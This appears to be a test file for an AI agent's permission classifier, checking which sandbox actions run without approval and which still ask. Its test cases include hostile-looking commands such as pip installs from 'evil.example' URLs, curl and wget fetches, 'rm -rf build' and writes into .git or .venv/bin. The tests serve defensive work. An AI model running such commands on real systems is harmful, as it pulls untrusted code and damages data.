import { mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { classifyTier, type ClassifyContext, type SentinelAction } from '../../../src/core/permissions/classifier';
import {
  defaultSentinelServices,
  forUnattendedRun,
  type SentinelServices,
} from '../../../src/core/permissions/context';
import { verifyPreDispatch } from '../../../src/core/permissions/dispatch';
import type { TrackedExecutableScope } from '../../../src/core/permissions/trackedExecutables';
import { createWebSearchTurnState } from '../../../src/core/permissions/webSearch';

/** Services where the owner's "run code in the sandbox without asking" switch is on or off. */
function servicesWith({
  sandbox_without_asking,
  offline = false,
}: {
  sandbox_without_asking: boolean;
  offline?: boolean;
}): SentinelServices {
  const services = defaultSentinelServices({ pinned_path: '/usr/bin:/bin' });
  services.sandboxWithoutAsking = () => Promise.resolve(sandbox_without_asking);
  services.isOffline = () => Promise.resolve(offline);
  return services;
}

function makeCtx({ services, workspace }: { services: SentinelServices; workspace: string | null }): ClassifyContext {
  return {
    services,
    tenant_id: 't1',
    created_by: 'u1',
    conversation_id: 'conv-1',
    repository_id: null,
    workspace_cwd: workspace,
    agent_intent: 'make a small script',
    web_search: createWebSearchTurnState(),
  };
}

/** The scope a classifier call for `workspace` in conversation `conv-1` reads from the tracked set. */
function trackedScope(workspace: string): TrackedExecutableScope {
  return {
    tenant_id: 't1',
    created_by: 'u1',
    conversation_id: 'conv-1',
    repository_id: null,
    workspace_cwd: workspace,
  };
}

/**
 * Writes a script into the workspace. `authored` records it the way the sandbox does for a file the
 * agent's own file tools wrote in this conversation; otherwise it stands for a repo, downloaded or unknown file.
 */
function writeScript({
  services,
  workspace,
  name,
  authored,
}: {
  services: SentinelServices;
  workspace: string;
  name: string;
  authored: boolean;
}): void {
  const file = join(workspace, name);
  writeFileSync(file, 'print(1)\n');
  if (authored) {
    services.tracked_store.track({ scope: trackedScope(workspace), file_identity: realpathSync(file) });
  }
}

function action(tool_name: string, canonical_params: Record<string, unknown>): SentinelAction {
  return { tool_name, canonical_params, tool_type: 'truefoundry-system', mcp_hints: {} };
}

function withWorkspace(run: (workspace: string) => Promise<void>): () => Promise<void> {
  return async () => {
    const workspace = mkdtempSync(join(tmpdir(), 'sandbox-no-cards-'));
    try {
      await run(workspace);
    } finally {
      rmSync(workspace, { recursive: true, force: true });
    }
  };
}

describe('in-sandbox work with the switch on runs without a card', () => {
  test(
    'a file write in the workspace is Tier 1 with its own reason',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'humanize_demo.py'), content: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_file_write');
      expect(decision.card).toBeNull();
      expect(decision.approval_token_id).toBeNull();
    }),
  );

  test(
    'run_code is Tier 1 with its own reason',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_run_code');
      expect(decision.card).toBeNull();
    }),
  );

  test.each([
    ['npm install humanize', 'sandbox_package_install'],
    ['pip install humanize', 'sandbox_package_install'],
    ['pip install "humanize==4.9.0"', 'sandbox_package_install'],
    ['python3 -m pip install humanize', 'sandbox_package_install'],
  ])('%s runs without a card', (command, reason) =>
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command, cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe(reason);
      expect(decision.card).toBeNull();
    })(),
  );

  test(
    'a scheduled run runs code without a card',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)' }),
        makeCtx({
          services: forUnattendedRun(servicesWith({ sandbox_without_asking: true })),
          workspace,
        }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.auto_deny).toBeNull();
    }),
  );
});

/** Runs that are silent only when the script they run is one Aman wrote in this conversation. */
const AUTHORED_SILENT_RUNS: readonly { command: string; file: string }[] = [
  { command: 'python3 agent_tool.py', file: 'agent_tool.py' },
  { command: 'python3 -u agent_tool.py --flag', file: 'agent_tool.py' },
  { command: 'bash agent_tool.sh', file: 'agent_tool.sh' },
  { command: 'node agent_tool.js', file: 'agent_tool.js' },
];

/** Runs that keep their card even when the switch is on: a script from outside Aman's conversation, or no script at all. */
const CARDED_RUNS: readonly { command: string; file: string | null }[] = [
  { command: 'python3 repo_tool.py', file: 'repo_tool.py' },
  { command: 'bash repo_tool.sh', file: 'repo_tool.sh' },
  { command: 'node repo_tool.js', file: 'repo_tool.js' },
  { command: 'sh -c "./repo_tool.sh"', file: 'repo_tool.sh' },
  { command: 'sh -c "./agent_tool.sh"', file: 'agent_tool.sh' },
  { command: 'python3 -m agent_tool', file: 'agent_tool.py' },
  { command: 'pytest -q', file: null },
  { command: 'python3 -m pytest -q', file: null },
  { command: 'npm test', file: null },
  { command: 'python3 -', file: null },
];

describe('a script runs silently only when Aman wrote it in this conversation', () => {
  test.each(AUTHORED_SILENT_RUNS)('$command runs without a card when Aman wrote the script', ({ command, file }) =>
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: file, authored: true });
      const decision = await classifyTier(
        action('exec', { command, cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_command');
      expect(decision.card).toBeNull();
    })(),
  );

  test.each(CARDED_RUNS)('$command keeps its card with the switch on', ({ command, file }) =>
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      if (file !== null) {
        writeScript({ services, workspace, name: file, authored: command.includes('agent_tool') });
      }
      const decision = await classifyTier(
        action('exec', { command, cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card).not.toBeNull();
    })(),
  );

  test.each([...AUTHORED_SILENT_RUNS, ...CARDED_RUNS])(
    '$command keeps its card with the switch off',
    ({ command, file }) =>
      withWorkspace(async workspace => {
        const services = servicesWith({ sandbox_without_asking: false });
        if (file !== null) {
          writeScript({ services, workspace, name: file, authored: true });
        }
        const decision = await classifyTier(
          action('exec', { command, cwd: workspace }),
          makeCtx({ services, workspace }),
        );
        expect(decision.tier).toBe(3);
        expect(decision.card).not.toBeNull();
      })(),
  );
});

describe('the same in-sandbox work asks with the switch off', () => {
  test(
    'run_code asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );

  test(
    'a file write asks in a card (Tier 2)',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'humanize_demo.py'), content: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(2);
    }),
  );

  test(
    'python3 on a script the agent wrote asks',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: false });
      writeScript({ services, workspace, name: 'humanize_demo.py', authored: true });
      const decision = await classifyTier(
        action('exec', { command: 'python3 humanize_demo.py', cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );

  test(
    'pip install asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'pip install humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );
});

describe('actions that leave the sandbox still ask, with the switch on', () => {
  test.each([
    ['curl over the network', 'exec', { command: 'curl https://example.com' }],
    ['git push', 'exec', { command: 'git push origin main' }],
    ['a wget download', 'exec', { command: 'wget https://example.com/x.tar.gz' }],
    ['a pip install from a web address', 'exec', { command: 'pip install https://evil.example/pkg.tar.gz' }],
    ['a pip install from a requirements file', 'exec', { command: 'pip install -r requirements.txt' }],
    ['an npm install from a git address', 'exec', { command: 'npm install git+https://example.com/pkg.git' }],
    ['an npm install with no package named', 'exec', { command: 'npm install' }],
    ['inline Python code', 'exec', { command: 'python3 -c "print(1)"' }],
    ['inline Node code', 'exec', { command: 'node -e "console.log(1)"' }],
    ['inline Python code read from stdin', 'exec', { command: 'python3 -' }],
    [
      'a pip install from an index URL',
      'exec',
      { command: 'pip install --index-url https://evil.example/simple humanize' },
    ],
    [
      'a pip install from an extra index URL',
      'exec',
      { command: 'pip3 install --extra-index-url https://evil.example/simple humanize' },
    ],
    [
      'a python -m pip install from an index URL',
      'exec',
      { command: 'python3 -m pip install --index-url https://evil.example/simple humanize' },
    ],
    [
      'a python -m pip install from a web address',
      'exec',
      { command: 'python3 -m pip install https://evil.example/pkg.tar.gz' },
    ],
    ['a python -m pip install from a path', 'exec', { command: 'python3 -m pip install ./vendor/pkg' }],
    ['a delete', 'exec', { command: 'rm -rf build' }],
    ['a model-supplied environment', 'exec', { command: 'python3 humanize_demo.py', env: { PYTHONPATH: '/tmp' } }],
    ['a write to .git', 'write_file', { path: '.git/config', content: 'x' }],
    ['a write outside the workspace', 'write_file', { path: '/etc/hosts.demo', content: 'x' }],
    ['a write into a sandbox tool folder', 'write_file', { path: '.venv/bin/evil', content: 'x' }],
  ])('asks for %s', (_label, tool_name, params) =>
    withWorkspace(async workspace => {
      const canonical = tool_name === 'exec' ? { cwd: workspace, ...params } : params;
      const decision = await classifyTier(
        action(tool_name, canonical),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).not.toBe(1);
      expect(decision.auto_deny).toBeNull();
    })(),
  );

  test(
    'a script run from outside the workspace asks',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'demo.py', authored: true });
      const decision = await classifyTier(
        action('exec', { command: `python3 ${join(workspace, 'demo.py')}`, cwd: '/' }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.reason).toBe('cwd_outside_workspace');
    }),
  );

  test(
    'an unplaceable command asks when there is no workspace',
    withWorkspace(async () => {
      const decision = await classifyTier(
        action('exec', { command: 'python3 demo.py' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace: null }),
      );
      expect(decision.tier).toBe(3);
    }),
  );
});

describe('offline mode refuses package installs before any card', () => {
  test(
    'python -m pip install is refused with the same plain line',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'python3 -m pip install humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true, offline: true }), workspace }),
      );
      expect(decision.auto_deny).toBe('offline_mode');
      expect(decision.card).toBeNull();
      expect(decision.reason_detail).toBe('Installing packages needs downloads, which are off while offline.');
    }),
  );

  test(
    'pip install is refused with one plain line',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'pip install humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true, offline: true }), workspace }),
      );
      expect(decision.auto_deny).toBe('offline_mode');
      expect(decision.card).toBeNull();
      expect(decision.reason_detail).toBe('Installing packages needs downloads, which are off while offline.');
    }),
  );

  test(
    'npm install is refused with the same plain line',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'npm install humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false, offline: true }), workspace }),
      );
      expect(decision.auto_deny).toBe('offline_mode');
      expect(decision.card).toBeNull();
    }),
  );
});

describe('a write through a symlink is checked where it lands', () => {
  /** A file outside the workspace that a link inside the workspace can point at. */
  function withOutside(run: (outside: string) => Promise<void>): () => Promise<void> {
    return async () => {
      const outside = mkdtempSync(join(tmpdir(), 'sandbox-outside-'));
      try {
        await run(outside);
      } finally {
        rmSync(outside, { recursive: true, force: true });
      }
    };
  }

  test(
    'a link whose final component points outside the workspace asks',
    withWorkspace(async workspace =>
      withOutside(async outside => {
        writeFileSync(join(outside, 'secret.txt'), 'kept');
        symlinkSync(join(outside, 'secret.txt'), join(workspace, 'link.txt'));
        const decision = await classifyTier(
          action('write_file', { path: join(workspace, 'link.txt'), content: 'changed' }),
          makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
        );
        expect(decision.tier).toBe(3);
        expect(decision.reason).toBe('write_outside_workspace');
      })(),
    ),
  );

  test(
    'a dangling link that leads outside the workspace asks',
    withWorkspace(async workspace =>
      withOutside(async outside => {
        symlinkSync(join(outside, 'not-yet.txt'), join(workspace, 'dangling.txt'));
        const decision = await classifyTier(
          action('write_file', { path: join(workspace, 'dangling.txt'), content: 'new' }),
          makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
        );
        expect(decision.tier).toBe(3);
        expect(decision.reason).toBe('write_outside_workspace');
      })(),
    ),
  );

  test(
    'a link that stays inside the workspace still runs without a card',
    withWorkspace(async workspace => {
      writeFileSync(join(workspace, 'target.txt'), 'kept');
      symlinkSync(join(workspace, 'target.txt'), join(workspace, 'inside.txt'));
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'inside.txt'), content: 'changed' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_file_write');
    }),
  );

  test(
    'a silent write re-checks its containment at dispatch and fails when the link is repointed outside',
    withWorkspace(async workspace =>
      withOutside(async outside => {
        const path = join(workspace, 'note.txt');
        writeFileSync(path, 'first');
        const ctx = makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace });
        const params = { path, content: 'second' };
        const decision = await classifyTier(action('write_file', params), ctx);
        expect(decision.tier).toBe(1);

        rmSync(path);
        writeFileSync(join(outside, 'secret.txt'), 'kept');
        symlinkSync(join(outside, 'secret.txt'), path);
        const error = await verifyPreDispatch({
          call: {
            tool_name: 'write_file',
            tool_type: 'truefoundry-system',
            canonical_params: params,
            tier: 1,
            approval_token_id: null,
            approval_binding: null,
            shell_binding: null,
          },
          ctx: { ...ctx, offline: false },
        });
        expect(error).toBeDefined();
      })(),
    ),
  );
});
